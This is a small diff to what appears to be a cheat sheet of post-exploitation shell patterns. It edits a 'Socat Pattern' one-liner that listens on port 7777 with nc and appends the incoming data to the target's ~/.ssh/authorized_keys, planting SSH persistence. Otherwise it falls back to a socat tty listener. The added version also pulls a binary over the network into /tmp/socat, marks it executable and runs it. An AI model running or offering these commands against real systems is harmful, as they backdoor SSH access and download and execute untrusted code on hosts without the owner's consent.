@@ -82,7 +82,7 @@ ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ss
 
 #### Socat Pattern
 ```
-ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; } || socat file:`tty`,raw,echo=0 TCP-L:7777;
+ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; } || { nc -lp 7777 > /tmp/socat && chmod +x /tmp/socat && /tmp/socat file:`tty`,raw,echo=0 TCP-L:7777; }
 ```
 
 #### Shell Upgrade Pattern
